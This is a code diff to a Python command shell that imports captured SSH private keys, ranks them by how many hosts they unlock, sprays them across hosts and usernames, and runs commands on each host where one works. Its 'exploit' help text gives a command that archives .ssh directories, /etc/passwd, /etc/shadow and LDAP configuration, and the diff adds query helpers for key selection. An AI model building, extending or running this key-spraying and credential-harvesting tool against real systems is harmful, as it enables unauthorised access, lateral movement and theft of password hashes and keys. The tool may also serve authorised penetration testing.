@@ -19,6 +19,7 @@ import base64
 import asyncio
 import asyncssh
 from tabulate import tabulate
+from collections import OrderedDict
 from sqlalchemy.orm import sessionmaker, scoped_session, Query
 from sqlalchemy.sql import func, select, case
 from sqlalchemy import create_engine
@@ -43,7 +44,7 @@ except ImportError:
         BACK_GREEN = ''
 
 # https://www.pythoncentral.io/sqlalchemy-orm-examples/
-#db = sqlite3.connect('session.db')
+# db = sqlite3.connect('session.db')
 
 logging.getLogger().setLevel(logging.DEBUG)
 asyncssh.set_log_level(logging.DEBUG)
@@ -84,9 +85,9 @@ def file_len(fname):
 
 
 def progbar(curr, total, full_progbar=20):
-    frac = curr/total
-    filled_progbar = round(frac*full_progbar)
-    print('Completed: [' + '#'*filled_progbar + ' '*(full_progbar-filled_progbar) + ']', '[{:>7.2%}]'.format(frac), end='\r')
+    frac = curr / total
+    filled_progbar = round(frac * full_progbar)
+    print('Completed: [' + '#' * filled_progbar + ' ' * (full_progbar - filled_progbar) + ']', '[{:>7.2%}]'.format(frac), end='\r')
     sys.stdout.flush()
 
 
@@ -261,7 +262,7 @@ class Shell(cmd2.Cmd):
                 if not key:
                     log.info(f"Importing {t} key: {f}")
                     keys[fp_sha256] = k
-                    #f.seek(io.SEEK_SET, 0)
+                    # f.seek(io.SEEK_SET, 0)
                     key = Key(source=f, key_type=t,
                               private_key=k.export_private_key(), fingerprint=fp_sha256)
                     self.db.add(key)
@@ -362,7 +363,6 @@ class Shell(cmd2.Cmd):
                     log.debug(f"Failed: {ex}")
                     pass
 
-
     session_parser = cmd2.Cmd2ArgumentParser()
     session_parser.add_argument(
         '-v', '--verbose', action='store_true', help='Show session info')
@@ -413,6 +413,48 @@ class Shell(cmd2.Cmd):
         rows = query.all()
         msg = f"Entries: {len(rows)}{os.linesep * 2}"
         self.ppaged(msg + tabulate(rows, cols, tablefmt='orgtbl'))
+
+    def get_keys_to_test(self, host, port, username):
+        """Return keys not tested for a username@host:port yet.
+        Ordered by number of host, that a key can logon to."""
+
+        vk = self.get_valued_keys().subquery()
+        tk = self.get_tested_keys(host, port, username).subquery()
+
+        q = (self.db.query(vk.c.fingerprint, vk.c.private_key)
+             .filter(vk.c.fingerprint.notin_(tk))
+             .order_by(vk.c.value))
+
+        return OrderedDict((x[0], x[1]) for x in q)
+
+    def get_valid_credentials(self, host, port, username):
+        """Returns keys that can logon to username@host:port"""
+
+        q = (self.db.query(Key.fingerprint, Key.private_key)
+             .outerjoin(Credential, Key.fingerprint == Credential.key_fingerprint)
+             .filter(Credential.host_address == host)
+             .filter(Credential.host_port == port)
+             .filter(Credential.username == username)
+             .filter(Credential.valid == True)
+             .group_by(Key.fingerprint))
+        return {(x[0], x[1]) for x in q}
+
+    def get_valued_keys(self):
+        return (self.db.query(Key.fingerprint.label('fingerprint'),
+                              Key.private_key,
+                              func.sum(case([(Credential.valid == True, 1)],
+                                            else_=0)).label('value'))
+                .outerjoin(Credential, Key.fingerprint == Credential.key_fingerprint)
+                .group_by(Key.fingerprint))
+
+    def get_tested_keys(self, host, port, username):
+        return (self.db.query(Key.fingerprint)
+                .outerjoin(Credential, Key.fingerprint == Credential.key_fingerprint)
+                .filter(Credential.host_address == host)
+                .filter(Credential.host_port == port)
+                .filter(Credential.username == username)
+                .filter(Credential.valid.in_([True, False]))
+                .group_by(Key.fingerprint))
 
     class PublicKeySSHClient(asyncssh.SSHClient):
 
@@ -499,7 +541,7 @@ class Shell(cmd2.Cmd):
                     valid_creds += 1
                     if not cmds:
                         continue
-                    #cmd = 'ls .ssh/'
+                    # cmd = 'ls .ssh/'
                     cmd_exec = True
                     async with conn:
                         for cmd in cmds:
@@ -518,7 +560,8 @@ class Shell(cmd2.Cmd):
                                 se = res.stderr
                                 es = res.exit_status
                                 c.exit_status = es
-                                # log.debug(f'[{host_address}:{host_port}] exit: {es}')
+                                # log.debug(f'[{host_address}:{host_port}]
+                                # exit: {es}')
                                 if es != 0:
                                     c.stderr = se
                                     log.info(f'[{log_id}] [{es}] "{se}"')
@@ -564,23 +607,25 @@ class Shell(cmd2.Cmd):
         i = 0
         if cmds:
             kq = self.db.query(Credential.username, Host.address, Host.port, Key.fingerprint, Key.private_key
-                    ).join('host').join('key').filter(Credential.valid == True).order_by(Credential.host_address)
+                               ).join('host').join('key').filter(Credential.valid == True).order_by(Credential.host_address)
             for x in kq:
                 jobs.append(self.exploit_single_target(username=x[0], host_address=x[1], host_port=x[2],
-                    keys={x[3]: x[4]}, cmds=cmds))
+                                                       keys={x[3]: x[4]}, cmds=cmds))
         else:
-            for (host_address, host_port) in self.db.query(Host.address, Host.port).filter(Host.enabled == True):
+            for (host, port) in self.db.query(
+                    Host.address, Host.port).filter(Host.enabled == True):
                 for username in usernames:
-                    kq = self.db.query(Key.fingerprint, Key.private_key).filter(~Key.fingerprint.in_(
-                        self.db.query(Credential.key_fingerprint).filter(
-                            Credential.host_address == host_address).filter(Credential.host_port == host_port)
-                        .filter(Credential.username == username).filter(Credential.valid.in_([True, False]))))
+                    # kq=self.db.query(Key.fingerprint, Key.private_key).filter(~Key.fingerprint.in_(
+                    #    self.db.query(Credential.key_fingerprint).filter(
+                    #        Credential.host_address == host_address).filter(Credential.host_port == host_port)
+                    #    .filter(Credential.username == username).filter(Credential.valid.in_([True, False]))))
 
-                    keys = {x[0]: x[1] for x in kq}
+                    #keys={x[0]: x[1] for x in kq}
+                    keys = self.get_keys_to_test(host, port, username)
                     if not keys:
                         continue
-                    jobs.append(self.exploit_single_target(host_address, host_port,
-                                                 username, dict(keys), cmds))
+                    jobs.append(self.exploit_single_target(host, port,
+                                                           username, keys, cmds))
                 i += 1
                 progbar(i, hosts_cnt)
         if not jobs:
@@ -611,7 +656,7 @@ class Shell(cmd2.Cmd):
             progbar(i, len(jobs))
 
         print()
-        log.info(75*'-')
+        log.info(75 * '-')
 
     exploit_parser = cmd2.Cmd2ArgumentParser()
     exploit_parser.add_argument(
@@ -660,7 +705,8 @@ E.g. exploit -c "tar -cf - .ssh /etc/passwd /etc/ldap.conf /etc/shadow /home/*/.
             self.print_table(q)
         if arg.results:
             q = self.db.query(Command.guid, Command.host_address, Command.host_port, Command.username, Command.cmd,
-                              Command.exit_status, func.coalesce(Command.stdout, Command.stderr, Command.exception).label('output'),
+                              Command.exit_status, func.coalesce(
+                                  Command.stdout, Command.stderr, Command.exception).label('output'),
                               Command.updated)
             self.print_table(q)
         if arg.save:
@@ -683,7 +729,7 @@ E.g. exploit -c "tar -cf - .ssh /etc/passwd /etc/ldap.conf /etc/shadow /home/*/.
 
     def precmd(self, line):
         self.db.rollback()
-        #line = line.lower()
+        # line = line.lower()
         # if self.file and 'playback' not in line:
         #    print(line, file=self.file)
         return line
